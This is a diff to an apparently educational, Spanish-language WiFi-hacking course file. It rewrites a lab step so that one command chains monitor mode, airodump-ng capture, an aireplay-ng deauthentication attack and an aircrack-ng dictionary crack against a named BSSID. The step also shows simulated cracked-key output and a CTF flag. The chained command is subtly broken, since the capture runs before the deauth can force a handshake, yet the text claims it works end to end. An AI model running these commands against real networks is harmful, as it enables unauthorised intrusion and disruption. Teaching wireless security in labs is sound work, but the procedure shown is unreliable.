@@ -344,12 +344,13 @@ const WIFI_AIRCRACK: Curso = {
     },
     {
       kind: "lab",
-      title: "Practicá: paso 4, crackeá la clave",
+      title: "Practicá: la cadena completa, de una",
       body:
-        "Corré aircrack-ng con rockyou.txt sobre el archivo captura-01.cap que grabaste. Mirá cómo prueba las claves y, si la del objetivo está en la lista, la encuentra.",
-      command: "aircrack-ng -w rockyou.txt captura-01.cap",
+        "Ahora encadenás los cuatro pasos en un solo comando (unidos con &&): modo monitor, captura enfocada, deauth para forzar el handshake y, al final, aircrack sobre el captura-01.cap que quedó grabado. Así ves la cadena entera funcionando de punta a punta.",
+      command:
+        "airmon-ng start wlan0 && airodump-ng --bssid E8:94:F6:77:88:04 -c 6 -w captura wlan0mon && aireplay-ng --deauth 5 -a E8:94:F6:77:88:04 wlan0mon && aircrack-ng -w rockyou.txt captura-01.cap",
       explain:
-        "KEY FOUND! [ invitado ]: aircrack rompió la clave de Vecino-2G y capturaste ND{wifi_wpa_crackeada}. Cayó porque 'invitado' es una palabra común que está en rockyou.txt. Con una clave larga y aleatoria, aircrack habría probado todo el diccionario sin encontrarla.",
+        "KEY FOUND! [ invitado ]: la cadena completa (airmon → airodump → aireplay → aircrack) rompió la clave de Vecino-2G y capturaste ND{wifi_wpa_crackeada}. Cayó porque 'invitado' es una palabra común que está en rockyou.txt. Con una clave larga y aleatoria, aircrack habría probado todo el diccionario sin encontrarla. Fijate que aircrack necesita el handshake que grabaron los pasos anteriores: por eso van encadenados con &&.",
       diagram: "fuerzabruta",
     },
     {
